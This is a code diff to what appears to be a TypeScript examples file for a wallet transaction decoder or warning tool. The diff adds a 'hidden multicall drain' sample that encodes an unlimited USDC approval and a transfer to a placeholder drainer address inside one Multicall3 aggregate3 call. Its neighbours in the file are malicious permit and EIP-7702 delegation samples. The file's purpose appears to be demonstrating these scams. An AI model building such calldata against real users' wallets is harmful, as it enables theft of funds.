@@ -1,3 +1,5 @@
+import { encodeFunctionData, maxUint256, parseAbiItem, type Address } from "viem";
+
 export interface Example {
   id: string;
   label: string;
@@ -8,6 +10,19 @@ export interface Example {
 const MAX_UINT256 = "f".repeat(64);
 const DEADBEEF_20 = "deadbeefdeadbeefdeadbeefdeadbeefdeadbeef"; // 20-byte fake spender
 const pad32 = (addr20: string) => "0".repeat(24) + addr20;
+
+const USDC = "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48" as Address;
+const DRAINER = "0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef" as Address;
+const enc = (sig: string, args: unknown[]) => encodeFunctionData({ abi: [parseAbiItem(sig)], args });
+
+// A Multicall3 batch that hides an unlimited approval + a drain transfer behind
+// a single innocent-looking aggregate3() call.
+const multicallDrain = enc("function aggregate3((address target,bool allowFailure,bytes callData)[])", [
+  [
+    { target: USDC, allowFailure: false, callData: enc("function approve(address,uint256)", [DRAINER, maxUint256]) },
+    { target: USDC, allowFailure: false, callData: enc("function transfer(address,uint256)", [DRAINER, 5_000_000_000n]) },
+  ],
+]);
 
 const maliciousPermit = JSON.stringify(
   {
@@ -44,6 +59,12 @@ export const EXAMPLES: Example[] = [
     label: "☠️ EIP-7702 delegation",
     note: "Post-Pectra account takeover — hands full control of your EOA to a contract.",
     value: delegation7702,
+  },
+  {
+    id: "multicall",
+    label: "☠️ Hidden multicall drain",
+    note: "A Multicall3 batch hiding an unlimited approval + drain transfer behind one call.",
+    value: multicallDrain,
   },
   {
     id: "approve",
